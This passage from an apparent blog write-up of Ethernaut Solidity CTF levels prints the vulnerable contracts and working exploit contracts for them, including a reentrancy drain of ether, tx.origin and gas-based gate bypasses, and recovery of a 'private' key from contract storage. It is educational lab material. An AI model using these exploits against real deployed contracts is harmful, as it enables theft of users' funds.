</span><br><span class="line">  using <span class="title class_">SafeMath</span> <span class="keyword">for</span> uint256;</span><br><span class="line">  <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint) public balances;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">donate</span>(<span class="params">address _to</span>) public payable &#123;</span><br><span class="line">    balances[_to] = balances[_to].<span class="title function_">add</span>(msg.<span class="property">value</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address _who</span>) public view returns (uint balance) &#123;</span><br><span class="line">    <span class="keyword">return</span> balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params">uint _amount</span>) public &#123;</span><br><span class="line">    <span class="keyword">if</span>(balances[msg.<span class="property">sender</span>] &gt;= _amount) &#123;</span><br><span class="line">      (bool result,) = msg.<span class="property">sender</span>.<span class="property">call</span>&#123;<span class="attr">value</span>:_amount&#125;(<span class="string">&quot;&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span>(result) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.<span class="property">sender</span>] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">receive</span>() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>We have to steal all the funds of this contract to complete the challenge. We have <code>donate</code> and <code>withdraw</code> functions so that we can donate and withdraw our ether, but if we notice the <code>withdraw</code> function carefully the contract is first transfering the ether using <code>msg.sender.call</code> and then deducting the amount from balance, since the contract is using <code>call</code> <strong>if the withdrawer is a smart contract</strong> the <code>receive</code> or <code>fallback</code> functions can be activated. we can simply call the <code>withdraw</code> function again and agian untill the balance is drained out in a recursive manner and it will work since we never completed the <code>msg.sender.call</code> line to get our balance reduced. this way we can steal all the funds of this contract.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">Reentrance</span> &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">donate</span>(<span class="params">address _to</span>) external payable;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address _who</span>) external view returns (uint balance);</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params">uint _amount</span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Exploit</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Reentrance</span> re;</span><br><span class="line">    address payable owner;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _address</span>) payable &#123;</span><br><span class="line">        re = <span class="title class_">Reentrance</span>(_address);</span><br><span class="line">        owner = <span class="title function_">payable</span>(msg.<span class="property">sender</span>);</span><br><span class="line">        re.<span class="property">donate</span>&#123;<span class="attr">value</span>: <span class="number">1000000000000000</span>&#125;(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params"></span>) public&#123;</span><br><span class="line">      re.<span class="title function_">withdraw</span>(re.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)));</span><br><span class="line">      owner.<span class="title function_">transfer</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">receive</span>() external payable &#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_">address</span>(re).<span class="property">balance</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_">address</span>(re).<span class="property">balance</span>&gt;=re.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)))&#123;</span><br><span class="line">          re.<span class="title function_">withdraw</span>(re.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">          re.<span class="title function_">withdraw</span>(<span class="title function_">address</span>(re).<span class="property">balance</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="11-Elevator"><a href="#11-Elevator" class="headerlink" title="11 - Elevator"></a>11 - Elevator</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">Building</span> &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">isLastFloor</span>(<span class="params">uint</span>) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Elevator</span> &#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">goTo</span>(<span class="params">uint _floor</span>) public &#123;</span><br><span class="line">    <span class="title class_">Building</span> building = <span class="title class_">Building</span>(msg.<span class="property">sender</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! building.<span class="title function_">isLastFloor</span>(_floor)) &#123;</span><br><span class="line">      floor = _floor;</span><br><span class="line">      top = building.<span class="title function_">isLastFloor</span>(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To complete this challenge we need to make the value of bool <code>top</code> as <code>True</code> but it only gets reassigned if the <code>Building</code> contract gives the value as <code>False</code>. since <code>msg.sender</code> is the <code>Building</code> contract and we are the one who defines it, we can make the value changed before the <code>Elevator</code> contract calls it again.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">Elevator</span> &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">goTo</span>(<span class="params">uint _floor</span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Building</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Elevator</span> e;</span><br><span class="line">    bool called;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _address</span>) &#123;</span><br><span class="line">        e = <span class="title class_">Elevator</span>(_address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">go</span>(<span class="params"></span>) public&#123;</span><br><span class="line">        e.<span class="title function_">goTo</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">isLastFloor</span>(<span class="params">uint _floor</span>) external returns (bool)&#123;</span><br><span class="line">      <span class="keyword">if</span>(called)&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">          called = <span class="literal">true</span>;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="12-Privacy"><a href="#12-Privacy" class="headerlink" title="12 - Privacy"></a>12 - Privacy</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Privacy</span> &#123;</span><br><span class="line"></span><br><span class="line">  bool public locked = <span class="literal">true</span>;</span><br><span class="line">  uint256 public <span class="variable constant_">ID</span> = block.<span class="property">timestamp</span>;</span><br><span class="line">  uint8 private flattening = <span class="number">10</span>;</span><br><span class="line">  uint8 private denomination = <span class="number">255</span>;</span><br><span class="line">  uint16 private awkwardness = <span class="title function_">uint16</span>(block.<span class="property">timestamp</span>);</span><br><span class="line">  bytes32[<span class="number">3</span>] private data;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">bytes32[<span class="number">3</span>] memory _data</span>) &#123;</span><br><span class="line">    data = _data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">unlock</span>(<span class="params">bytes16 _key</span>) public &#123;</span><br><span class="line">    <span class="built_in">require</span>(_key == <span class="title function_">bytes16</span>(data[<span class="number">2</span>]));</span><br><span class="line">    locked = <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    A bunch of super advanced solidity algorithms...</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`</span></span><br><span class="line"><span class="comment">      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,</span></span><br><span class="line"><span class="comment">      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\</span></span><br><span class="line"><span class="comment">      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)</span></span><br><span class="line"><span class="comment">      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To complete this challenge we need to <strong>understand how solidity stores each type of data</strong> and <strong>how explicit converting works in solidity</strong> and <strong>how the storage works inside the evm</strong>, and read the key by calculating which slot it is stored and give it to <strong>unlock</strong> function.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">In [<span class="number">134</span>]: ad = <span class="string">&#x27;0x79B55BD4ED78B2aF03e07d8b5C0f2CfF390E3d3E&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">135</span>]: io.eth.get_storage_at(ad,<span class="number">0</span>)</span><br><span class="line">Out[<span class="number">135</span>]: HexBytes(<span class="string">&#x27;0x0000000000000000000000000000000000000000000000000000000000000001&#x27;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">136</span>]: io.eth.get_storage_at(ad,<span class="number">1</span>)</span><br><span class="line">Out[<span class="number">136</span>]: HexBytes(<span class="string">&#x27;0x00000000000000000000000000000000000000000000000000000000637fe66c&#x27;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">137</span>]: io.eth.get_storage_at(ad,<span class="number">2</span>)</span><br><span class="line">Out[<span class="number">137</span>]: HexBytes(<span class="string">&#x27;0x00000000000000000000000000000000000000000000000000000000e66cff0a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">138</span>]: io.eth.get_storage_at(ad,<span class="number">3</span>)</span><br><span class="line">Out[<span class="number">138</span>]: HexBytes(<span class="string">&#x27;0xbffb089211dbe3c12a6211e34002c0d91397fa7c8ec0700e6addc0df29340649&#x27;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">139</span>]: io.eth.get_storage_at(ad,<span class="number">4</span>)</span><br><span class="line">Out[<span class="number">139</span>]: HexBytes(<span class="string">&#x27;0xefd4f1ae0109ba73e577a3bd5f92d655ad6d0c1292992609c43612a4168059c9&#x27;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">140</span>]: io.eth.get_storage_at(ad,<span class="number">5</span>)</span><br><span class="line">Out[<span class="number">140</span>]: HexBytes(<span class="string">&#x27;0x332faac480ae54c0664260478cc5d622f8af6cae087fe33c24b297f6ba0105f5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">141</span>]: <span class="string">&#x27;0x332faac480ae54c0664260478cc5d622f8af6cae087fe33c24b297f6ba0105f5&#x27;</span>[:<span class="number">34</span>]</span><br><span class="line">Out[<span class="number">141</span>]: <span class="string">&#x27;0x332faac480ae54c0664260478cc5d622&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">unlock</span>(<span class="string">&#x27;0x332faac480ae54c0664260478cc5d622&#x27;</span>)</span><br></pre></td></tr></table></figure><hr><h2 id="13-Gatekeeper-One"><a href="#13-Gatekeeper-One" class="headerlink" title="13 - Gatekeeper One"></a>13 - Gatekeeper One</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">GatekeeperOne</span> &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier <span class="title function_">gateOne</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.<span class="property">sender</span> != tx.<span class="property">origin</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier <span class="title function_">gateTwo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">require</span>(<span class="title function_">gasleft</span>() % <span class="number">8191</span> == <span class="number">0</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier <span class="title function_">gateThree</span>(<span class="params">bytes8 _gateKey</span>) &#123;</span><br><span class="line">      <span class="built_in">require</span>(<span class="title function_">uint32</span>(<span class="title function_">uint64</span>(_gateKey)) == <span class="title function_">uint16</span>(<span class="title function_">uint64</span>(_gateKey)), <span class="string">&quot;GatekeeperOne: invalid gateThree part one&quot;</span>);</span><br><span class="line">      <span class="built_in">require</span>(<span class="title function_">uint32</span>(<span class="title function_">uint64</span>(_gateKey)) != <span class="title function_">uint64</span>(_gateKey), <span class="string">&quot;GatekeeperOne: invalid gateThree part two&quot;</span>);</span><br><span class="line">      <span class="built_in">require</span>(<span class="title function_">uint32</span>(<span class="title function_">uint64</span>(_gateKey)) == <span class="title function_">uint16</span>(<span class="title function_">uint160</span>(tx.<span class="property">origin</span>)), <span class="string">&quot;GatekeeperOne: invalid gateThree part three&quot;</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">enter</span>(<span class="params">bytes8 _gateKey</span>) public gateOne gateTwo <span class="title function_">gateThree</span>(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.<span class="property">origin</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To complete this challenge we need to be the entrant, we can do that if we are able to get pass these three function modifiers which acts like gates. we cannot pass through first gate if we directly interact with the contract which means we have to write a smart contract to interact with this contract, second gate checks if the gas left is a multiplel of <code>8191</code> so we need to interact with contract giving the requiered amount of gas which is a multiple of <code>8191</code>. Third gates needs a <code>_gatekey</code> which passes all the requirements which need the <code>_gatekey</code> to be a <code>bytes8</code> type and the least significant 16 bits must be equal to least significant 32 bits and lowest 16 bits of <code>tx.origin</code>, and should not be equal to the <code>_gatekey</code>: <code>uint32(uint64(_gateKey)) == uint16(uint64(_gateKey) != uint64(_gateKey) == uint16(uint160(tx.origin))</code> . satisfying all these requirements of three gates makes us the entrant.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">GatekeeperOne</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">enter</span>(<span class="params">bytes8 _gateKey</span>) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Exploit</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">GatekeeperOne</span> gk1;</span><br><span class="line">    uint64 gatekey = <span class="number">0x10000c5d6</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _address</span>) payable &#123;</span><br><span class="line">        gk1 = <span class="title class_">GatekeeperOne</span>(_address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">exploit</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        <span class="keyword">for</span>(uint i = <span class="number">0</span>; i&lt;= <span class="number">8191</span>; i++)&#123;</span><br><span class="line">          <span class="comment">// gk1.enter&#123;gas: 5000000 + i&#125;(bytes8(gatekey));</span></span><br><span class="line">          <span class="title function_">address</span>(gk1).<span class="property">call</span>&#123;<span class="attr">gas</span>: <span class="number">5000000</span> + i&#125;(abi.<span class="title function_">encodeWithSignature</span>(<span class="string">&quot;enter(bytes8)&quot;</span>, <span class="title function_">bytes8</span>(gatekey)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="14-Gatekeeper-Two"><a href="#14-Gatekeeper-Two" class="headerlink" title="14 - Gatekeeper Two"></a>14 - Gatekeeper Two</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">GatekeeperTwo</span> &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier <span class="title function_">gateOne</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.<span class="property">sender</span> != tx.<span class="property">origin</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier <span class="title function_">gateTwo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; x := <span class="title function_">extcodesize</span>(<span class="title function_">caller</span>()) &#125;</span><br><span class="line">    <span class="built_in">require</span>(x == <span class="number">0</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier <span class="title function_">gateThree</span>(<span class="params">bytes8 _gateKey</span>) &#123;</span><br><span class="line">    <span class="built_in">require</span>(<span class="title function_">uint64</span>(<span class="title function_">bytes8</span>(<span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(msg.<span class="property">sender</span>)))) ^ <span class="title function_">uint64</span>(_gateKey) == <span class="title function_">type</span>(uint64).<span class="property">max</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">enter</span>(<span class="params">bytes8 _gateKey</span>) public gateOne gateTwo <span class="title function_">gateThree</span>(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.<span class="property">origin</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This challenge is a sequel of the previous one and similarly have three gates to pass and the first is same as the the gatekeeper one challenge, second gate checks if the size of data of the caller is 0 using <code>extcodesize(caller())</code>. this gate can be passed if the caller contract is running itâ€™s constructor while this call is made. comming to the third gate, it checks the <code>_gatekey</code> to be equal to <code>2**256</code> when xored with the caller address.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">GatekeeperTwo</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">enter</span>(<span class="params">bytes8 _gateKey</span>) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Exploit</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">GatekeeperTwo</span> gk2;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _address</span>) payable &#123;</span><br><span class="line">        gk2 = <span class="title class_">GatekeeperTwo</span>(_address);</span><br><span class="line">        gk2.<span class="title function_">enter</span>( <span class="title function_">bytes8</span>(<span class="title function_">uint64</span>(<span class="title function_">bytes8</span>(<span class="title function_">keccak256</span>(abi.<span class="title function_">encodePacked</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>))))) ^ <span class="title function_">type</span>(uint64).<span class="property">max</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="15-Naught-Coin"><a href="#15-Naught-Coin" class="headerlink" title="15 - Naught Coin"></a>15 - Naught Coin</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;openzeppelin-contracts-08/token/ERC20/ERC20.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> contract <span class="title class_">NaughtCoin</span> is <span class="title class_">ERC20</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// string public constant name = &#x27;NaughtCoin&#x27;;</span></span><br><span class="line">  <span class="comment">// string public constant symbol = &#x27;0x0&#x27;;</span></span><br><span class="line">  <span class="comment">// uint public constant decimals = 18;</span></span><br><span class="line">  uint public timeLock = block.<span class="property">timestamp</span> + <span class="number">10</span> * <span class="number">365</span> days;</span><br><span class="line">  uint256 public <span class="variable constant_">INITIAL_SUPPLY</span>;</span><br><span class="line">  address public player;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">address _player</span>) </span><br><span class="line">  <span class="title class_">ERC20</span>(<span class="string">&#x27;NaughtCoin&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>) &#123;</span><br><span class="line">    player = _player;</span><br><span class="line">    <span class="variable constant_">INITIAL_SUPPLY</span> = <span class="number">1000000</span> * (<span class="number">10</span>**<span class="title function_">uint256</span>(<span class="title function_">decimals</span>()));</span><br><span class="line">    <span class="comment">// _totalSupply = 